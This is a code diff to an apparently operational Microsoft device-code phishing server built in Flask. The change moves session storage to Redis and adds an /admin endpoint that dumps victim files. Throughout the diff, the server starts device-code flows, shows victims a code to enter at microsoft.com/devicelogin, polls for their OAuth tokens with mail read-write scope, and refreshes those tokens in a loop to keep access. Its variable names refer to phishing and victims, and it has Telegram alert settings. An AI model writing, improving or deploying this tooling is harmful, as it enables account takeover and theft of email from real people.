@@ -9,13 +9,15 @@ from datetime import datetime
 import threading
 from dotenv import load_dotenv
 from pathlib import Path
-import atexit
 import uuid
-from threading import Lock
+import redis
+
+redis_url = os.getenv("REDIS_URL", "redis://localhost:6379/0")
+r = redis.from_url(redis_url)
+r.ping()
 
 PHISH_PORT = int(os.getenv('PHISH_PORT', 5000))
 
-flow_lock = Lock()
 
 load_dotenv()
 
@@ -28,36 +30,13 @@ SCOPES = "https://graph.microsoft.com/Mail.ReadWrite User.Read offline_access"
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
-FLOWS_FILE = "active_flows.json"
-active_flows = {}
+
 
 print(f"🚀 Production server ready")
 print(f"   Victims dir: {Path('.').resolve()}")
 
-def load_persistent_flows():
-    try:
-        with open(FLOWS_FILE, 'r') as f:
-            loaded = json.load(f)
-        with flow_lock:
-            active_flows.clear()
-            active_flows.update(loaded)
-        print(f"📁 Loaded {len(loaded)} flows")
-    except:
-        with flow_lock:
-            active_flows.clear()
 
-def save_persistent_flows():
-    with flow_lock:
-        flows_to_save = {k: v.copy() for k, v in active_flows.items()}
 
-    try:
-        with open(FLOWS_FILE, 'w') as f:
-            json.dump(flows_to_save, f, indent=2)
-    except: pass
-
-# Init
-load_persistent_flows()
-atexit.register(save_persistent_flows)
 
 def safe_graph_call(url, headers, timeout=15):
     try:
@@ -114,8 +93,8 @@ def start_flow():
     session_id = str(uuid.uuid4())
     success = start_device_flow(session_id)
     print(f"🚀 NEW FLOW: {session_id} {'✅' if success else '❌'}")
-    with flow_lock:
-         flow = active_flows.get(session_id)
+    flow_data = r.get(f"flow:{session_id}")
+    flow = json.loads(flow_data) if flow_data else None
     return jsonify({
     'session_id': session_id,
     'user_code': flow.get('user_code') if flow else None
@@ -128,25 +107,35 @@ def get_code():
     if not session_id:
         return jsonify({'error': 'missing sid - call /start first'}), 400
     
-    print(f"🔍 /code DEBUG: looking for sid={session_id}, active_flows has {len(active_flows)} entries")
-    with flow_lock:
-        flow = active_flows.get(session_id)
-        print(f"🔍 FOUND: {bool(flow)}")
-        if not flow:
-            print(f"🔍 ACTIVE KEYS: {list(active_flows.keys())[:3]}...")
-            return jsonify({'error': 'session missing', 'sid': session_id, 'total_flows': len(active_flows)}), 404
-        
-        # Always return user_code once created (supports personal/work accounts)
-        if flow.get('user_code'):
-            return jsonify({
-                'code': flow['user_code'],
-                'status': 'ready',
-                'message': 'Copy code → microsoft.com/devicelogin',
-                'session_valid': True
-            })
-        
-        return jsonify({'status': 'generating', 'retry': 2})
+    print(f"🔍 /code DEBUG: looking for sid={session_id}")
+    flow_data = r.get(f"flow:{session_id}")
+    flow = json.loads(flow_data) if flow_data else None
+    print(f"🔍 FOUND: {bool(flow)}")
+    if not flow:
+        print(f"🔍 ACTIVE KEYS: {list(r.keys('flow:*'))[:3]}...")
+        return jsonify({'error': 'session missing', 'sid': session_id, 'total_flows': len([k for k in r.keys("flow:*")])}), 404
+    
+    if flow.get('user_code'):
+        return jsonify({
+            'code': flow['user_code'],
+            'status': 'ready',
+            'message': 'Copy code → microsoft.com/devicelogin',
+            'session_valid': True
+        })
+    
+    return jsonify({'status': 'generating', 'retry': 2})
 
+
+@app.route('/admin')
+def admin():
+    files = [f for f in os.listdir() if f.startswith("victim_") and f.endswith(".json")]
+
+    data = {}
+    for f in files:
+        with open(f) as file:
+            data[f] = file.read()
+
+    return jsonify(data)
 
 
 def start_device_flow(session_id):
@@ -165,9 +154,6 @@ def start_device_flow(session_id):
             print(f"❌ MS HTTP {resp.status_code}: {resp.text}")
             return False
         
-
-
-
         try:
             resp_json = resp.json()
 
@@ -175,19 +161,18 @@ def start_device_flow(session_id):
             print(f"❌ MS invalid JSON: {resp.text[:200]}")
             return False
 
-        with flow_lock:
-            active_flows[session_id] = {
-                'device_code': resp_json["device_code"],
-                'user_code': resp_json["user_code"],
-                'expires_in': resp_json["expires_in"],
-                'interval': resp_json.get("interval", 5),
-                'start_time': time.time(),
-                'polling': False
-            }
-        
+        flow_data = {
+            'device_code': resp_json["device_code"],
+            'user_code': resp_json["user_code"],
+            'expires_in': resp_json["expires_in"],
+            'interval': resp_json.get("interval", 5),
+            'start_time': time.time(),
+            'polling': False
+        }
+        r.setex(f"flow:{session_id}", resp_json["expires_in"], json.dumps(flow_data))
         threading.Thread(target=poll_tokens, args=(session_id,), daemon=True).start()
-        save_persistent_flows()
         return True
+        
     except Exception as e:
         print(f"❌ START FAILED {session_id}: {e}")
         import traceback
@@ -199,15 +184,13 @@ def poll_tokens(session_id):
     poll_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
     
     while True:
-        with flow_lock:
-            if session_id not in active_flows:
-                break
-            flow = active_flows[session_id].copy()
-            if flow is None:
-                break
-            if time.time() - flow['start_time'] > flow['expires_in']:
-                del active_flows[session_id]
-                break
+        flow_data = r.get(f"flow:{session_id}")
+        if not flow_data:
+            break
+        flow = json.loads(flow_data)
+        if time.time() - flow['start_time'] > flow['expires_in']:
+            r.delete(f"flow:{session_id}")
+            break
         
         try:
             resp = requests.post(poll_url, data={
@@ -222,7 +205,8 @@ def poll_tokens(session_id):
                 time.sleep(flow['interval'])
             else:
                 time.sleep(5)
-        except: time.sleep(5)
+        except:
+            time.sleep(5)
 
 
 
@@ -276,10 +260,10 @@ def token_refresh_loop(session_id, refresh_token, current_access_token):
         try:
             time.sleep(3000)  # Refresh every 50 minutes (access tokens last ~1hr)
             
-            with flow_lock:
-                if session_id not in active_flows:
-                    break
-                flow = active_flows[session_id]
+            flow_data = r.get(f"flow:{session_id}")
+            if not flow_data:
+                break
+            flow = json.loads(flow_data)
             
             # Refresh token
             resp = requests.post(refresh_url, data={
@@ -300,11 +284,13 @@ def token_refresh_loop(session_id, refresh_token, current_access_token):
                 if not test_profile.get("error"):
                     print(f"🔄 Token refreshed for {session_id}")
                     
-                    with flow_lock:
-                        if session_id in active_flows:
-                            active_flows[session_id]['access_token'] = new_access_token
-                            active_flows[session_id]['refresh_token'] = new_refresh_token
-                            active_flows[session_id]['last_refresh'] = time.time()
+                flow_data = r.get(f"flow:{session_id}")
+                if flow_data:
+                    flow = json.loads(flow_data)
+                    flow['access_token'] = new_access_token
+                    flow['refresh_token'] = new_refresh_token
+                    flow['last_refresh'] = time.time()
+                    r.setex(f"flow:{session_id}", 3600, json.dumps(flow))
                 
                 refresh_token = new_refresh_token  # Update for next refresh
             else:
@@ -318,9 +304,7 @@ def token_refresh_loop(session_id, refresh_token, current_access_token):
 
 @app.route('/status')
 def status():
-    with flow_lock:
-        active_count = len(active_flows)
-        
+    active_count = len([k for k in r.keys("flow:*")])     
     return jsonify({
         "active_flows": active_count,
         "victim_files": len(list(Path(".").glob("victim_*.json"))),
